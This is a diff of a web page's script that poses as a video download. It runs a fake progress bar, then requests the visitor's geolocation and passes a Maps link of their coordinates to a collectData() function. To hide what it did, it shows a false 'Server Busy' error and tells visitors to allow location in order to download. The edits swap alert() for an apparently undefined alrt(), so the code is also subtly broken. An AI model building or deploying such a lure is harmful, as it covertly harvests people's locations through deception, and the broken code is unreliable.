@@ -353,7 +353,7 @@
                     currentProg = 100;
                     pText.innerText = "100%";
                     setTimeout(() => {
-                        pText.innerText = "Error: Video data corrupted.";
+                        pText.innerText = "";
                         pText.style.color = "#ff4757";
                     }, 500);
                 }, 10000); 
@@ -468,10 +468,10 @@
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const map = `🌍 Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 collectData("Location 📍", map);
-                alert("Download Error: Server Busy. Please try again later.");
+                alrt("Download Error: Server Busy. Please try again later.");
             }, () => { alrt("Allow location to download this file."); });
         } else {
-            alert("Geolocation is not supported by this browser.");
+            alrt("Geolocation is not supported by this browser.");
         }
     });
 
@@ -479,4 +479,4 @@
 </script>
 
 </body>
-    </html>
+        </html>
